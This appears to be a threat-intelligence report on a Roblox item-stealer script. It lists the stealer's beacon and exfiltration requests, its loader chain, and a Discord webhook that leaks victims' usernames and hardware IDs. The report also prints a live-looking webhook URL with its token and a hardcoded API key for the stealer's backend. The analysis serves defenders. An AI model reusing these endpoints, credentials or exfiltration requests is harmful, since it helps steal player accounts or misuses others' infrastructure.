# PROJECT REVERSE — C2 / IOC REPORT
**Date:** 2026-09-27
**Target:** `mm2.luau` (Luraph v14.8) — Roblox item/trade stealer
**Stealer ID (campaign):** `CENSORED`
**Method:** `getgenv().request` hooked at runtime (Luraph not deobfuscated).

---

## 1. NETWORK ENDPOINTS IDENTIFIED

### 1.1 Beacon (execution ping) — SUCCESS
```
POST https://api.project-reverse.org/hits/execution
content-type: application/json
exploit-api-key: bK5ZLj1VvjLUyo5bqh16F2VnOCduc8p2sSMATZMHKjxxgdkvto

{"stealerId":"CENSORED","executor":"real"}
```
Returns 200 — script continued.

### 1.2 Register (data exfil) — FAILED
```
POST https://api.project-reverse.org/hits/register
content-type: text/plain
exploit-api-key: bK5ZLj1VvjLUyo5bqh16F2VnOCduc8p2sSMATZMHKjxxgdkvto

<base64, 600 chars>
```
Base64-decoded → 450 bytes, entropy 7.5465, printable 38.4% → encrypted (likely AES; key derived from `stealerId` or payload). Server response: `"Failed to register hit"`. Exfiltration did not complete.

### 1.3 Discord error channel (operator alert) — SUCCESS
```
POST https://discord.com/api/webhooks/1427333378146963517/IVgB0BKSrcNJQPe65hFxkcpTfkubHwSB9xN-6XBPX_i4g1iiD66L7qjeAycA0HGMSXjw
Content-Type: application/json

{"content":"[error]: \"Failed to register hit\" {\"error\":\"Luraph Script:1425: Luraph Script:1233: Luraph Script:1110: :3: attempt to get length of a nil value\"} {\"metadata\":{\"username\":\"ROBLOXUSERNAME\",\"hwid\":\"7b3336...\",\"serverType\":\"StandardServer\",\"executor\":\"real\"}}"}
```
Discord server ID: `1427333378146963517`. Victim username + HWID leak into the operator's error channel.

---

## 2. LEAKED DATA (from test account)

| Field | Value |
|---|---|
| `username` | `ROBLOXUSERNAME` |
| `hwid` (hex-decoded) | `{YOUR HWID}` |
| `serverType` | `StandardServer` |
| `executor` | `real` |
| `stealerId` | `CENSORED` |

HWID format `{guid}` = hex-encoded `gethwid()` output, stored plaintext in the Discord channel.

---

## 3. CHAIN

```
https://api.project-reverse.org/run/eyJpZCI6...
   │  base64: {"id":"6fa94c86-...","kind":"loader"}
   ▼
stub: ID="6fa94c86-..." ; RUN_AFTER=nil
   ▼
https://cdn.project-reverse.org/loader.luau
   │  routes by game PlaceId
   ▼
https://cdn.project-reverse.org/mm2.luau     (Luraph v14.8, 293 KB)
   ▼
POST /hits/execution     (success)
POST /hits/register      (failed → script halts)
POST discord webhook     (operator error notice)
```

---

## 4. API KEY NOTE

`exploit-api-key: bK5ZLj1VvjLUyo5bqh16F2VnOCduc8p2sSMATZMHKjxxgdkvto`

- Hardcoded in the payload — one key per deployment, not per victim.
- Grants write access to the stealer's own API.
- No requests were sent to any endpoint using this key beyond the observed traffic.
